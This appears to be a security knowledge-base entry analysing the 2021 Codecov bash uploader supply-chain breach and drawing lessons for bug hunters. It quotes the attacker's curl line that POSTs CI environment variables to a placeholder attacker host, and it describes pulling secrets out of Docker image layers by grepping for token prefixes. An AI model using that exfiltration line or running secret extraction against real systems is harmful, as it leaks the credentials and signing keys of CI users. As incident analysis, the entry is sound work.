---
title: Codecov bash uploader breach (Apr 2021)
slug: codecov-bash-uploader
created_utc: 2026-05-22T00:00:00Z
updated_utc: 2026-05-22T00:00:00Z
tags: [incident/supply-chain, technique/ci-script-tamper, technique/env-exfil, registry/docker, scope/ci-cd]
inbound: []
---

# Codecov bash uploader breach (Apr 2021)

## What happened

On **2021-04-01** Codecov discovered that the **`codecov-bash`** uploader
script -- piped from `https://codecov.io/bash` into thousands of CI
jobs -- had been modified by an external attacker to exfiltrate the
contents of `env` plus `git remote -v` to an attacker-controlled IP on
every invocation. The modification went live on **2021-01-31** and was
undetected for **~3 months**. A customer flagged a SHA mismatch between
the script served from GCS and the published checksum, which triggered
the post-mortem.

Root cause was a Docker image misconfiguration: an HMAC key for the GCS
service account that hosted `codecov-bash` was bundled into an
intermediate layer of the **public** `codecov/codecov-bash` Docker
image. The attacker pulled the image, used `docker history` to
introspect layers, extracted the key, and used it to overwrite the
canonical script in GCS. Customers loading `codecov-bash` via the
documented `curl | bash` invocation got the tampered version. Confirmed
downstream impact: **HashiCorp** (GPG signing-key exposure), **Twilio**,
**Rapid7**, **Confluent**, **Monday.com**, and ~29k Codecov customers
were instructed to rotate.

## Attack chain

1. **Public Docker image leaks build-time secret.** The Dockerfile
   used `ADD` / `COPY` to insert a credential into the image during
   build, then "removed" it in a later layer with `rm`. Docker image
   layers are immutable; the credential was still present in the
   intermediate layer and trivially exposed via `docker pull` +
   `docker save` + tar inspection (or `docker history --no-trunc`).
2. **Lateral move to GCS.** Extracted HMAC key for a GCS service
   account → write access to the bucket serving `codecov.io/bash`.
3. **Single-line uploader tamper.** Attacker added one curl line at the
   end of `codecov-bash`:
   `curl -sm 0.5 -d "$(git remote -v)<<<<<< ENV $(env)" https://<ATTACKER-IP>/upload/v2 || true`
   The `<<<<<< ENV` delimiter let the receiver split the
   git-remote section from the env-dump cleanly across multiple jobs.
4. **CI fan-out exfil.** Every customer running `bash <(curl -s
   https://codecov.io/bash)` in their pipeline POSTed every CI-job env
   var -- including `AWS_*`, `GH_TOKEN`, `NPM_TOKEN`, GPG signing keys
   loaded into the env, `CI_*` secrets -- to the attacker server. CI
   logs did not show the exfil because of `-s` and `0.5s` timeout.
5. **Detection by integrity diff.** A customer compared the script
   served by GCS against the project's `SHASUMS512.txt` and saw the
   hash mismatch. Codecov rotated keys, replaced the script,
   notified affected customers, and triggered the cascade of secondary
   rotations across the customer base.

## Lessons for bug hunters

- **`curl | bash` from any CI vendor is the canonical CI supply chain
  hole.** When auditing a target's `.github/workflows/`, `.gitlab-ci.yml`,
  `circleci/config.yml`, list every external `curl`/`wget` invocation
  that pipes into a shell. Each one is a third-party-trust assertion you
  should be skeptical of. Even if the vendor pins by version, ask
  whether the URL is content-addressed (`@sha256:...`) or mutable.
- **Docker images carry secrets in intermediate layers.** On every
  target with a published image (`org/foo`, internal ECR/GCR registries
  that anonymous-pull works on), run `docker pull` then `docker save -o
  out.tar` and grep the layer tarballs for `AKIA`, `ghp_`, `xoxb-`,
  private-key headers, GCP service-account JSON shapes. Bonus: gitleaks
  or trufflehog over the extracted layer tree. Same primitive as
  [[circleci-2023-oauth]] env-var theft once a layer key is in hand.
- **CI env vars are the loot.** Anything reaching a tampered CI step
  (Codecov, dependency installer, lint action) sees the full `env` of
  the job: tokens, signing keys, deployment creds. When you find a
  vuln that lets you write to a CI step's stdout or modify a workflow
  step, the impact is "exfil every secret the job has". See
  [[tj-actions-changed-files]] for the GitHub-Actions-tag-tampering
  analogue.
- **3-month dwell time is normal.** Supply-chain compromises are
  measured in months, not days. If you find tampering evidence on a
  CDN/bucket, the disclosure window is wide and material -- always
  ask the vendor for the bucket's audit log retention period as part
  of the report.
- **Checksum publication is necessary but not sufficient.** Codecov
  published `SHASUMS512` but customers did not enforce it. If your
  target ships any script over HTTPS, check whether downstream
  consumers verify the checksum -- a finding of "checksum published
  but not verified" is reportable on its own.

## Primary sources

- [Codecov: Post-Mortem / Root Cause Analysis (April 2021)](https://about.codecov.io/apr-2021-post-mortem/)
  -- vendor post-mortem with the Docker-layer credential extraction explanation.
- [GitGuardian: "Codecov supply chain attack breakdown"](https://blog.gitguardian.com/codecov-supply-chain-breach/)
  -- annotated technical walkthrough of the inserted exfil line and downstream impact.

## Related

- [[tj-actions-changed-files]]
- [[circleci-2023-oauth]]
- [[heroku-travis-oauth-2022]]
